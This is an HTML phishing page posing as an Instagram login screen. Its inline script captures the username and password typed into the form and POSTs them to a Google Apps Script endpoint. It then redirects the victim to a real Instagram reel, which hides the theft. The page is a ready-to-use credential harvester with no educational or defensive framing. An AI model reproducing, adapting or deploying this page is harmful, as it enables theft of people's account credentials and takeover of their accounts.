<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <link rel="stylesheet" href="style.css">
  <link rel="stylesheet" href="google.css">
</head>
<body>
  <div class="container">
    <div class="login-form">
      <img src="ig.png" id="ig">
      <form  name="email_sub">
        <input type="text" name="Email" placeholder="Username" required onkeyup="this.setAttribute('value', this.value);"  value="">
        <input type="password" name="Message" placeholder="Password" required onkeyup="this.setAttribute('value', this.value);" value="">
        <input type="submit" value="Log In" id="redirect">
      </form>
      <p>Don't have an account? <a href="index.html">Sign up</a></p>
    </div>
  </div>

  <!-- ScriptFile -->
  <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbxsaGg8oYfq9_DsQrzWN--QutW9vYZDGwgBgXv_GHG_SwjaCxyfijVe4KTbH_-hjsXi/exec'
    const form = document.forms['email_sub']
    form.addEventListener('submit', e => {
      e.preventDefault();
      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(res => {alert('Submited Succesfully');
      })
        .catch(error => {
          console.error('Error!', error.message);
          alert('Error submission unsuccesfull');
        })
        .then( a => (form.reset()));
    })
    </script>  
    <script>
      // Get a reference to the button element
      var button = document.getElementById("redirect");

      // Define the URL you want to redirect to
      var redirectUrl = "https://www.instagram.com/reel/CxF-KFSPYze/?igshid=MzRlODBiNWFlZA==";

      // Add a click event listener to the button
      button.addEventListener("click", function() {
          // Redirect to the specified URL
          window.location.href = redirectUrl;
      });
  </script>

</body>
</html>
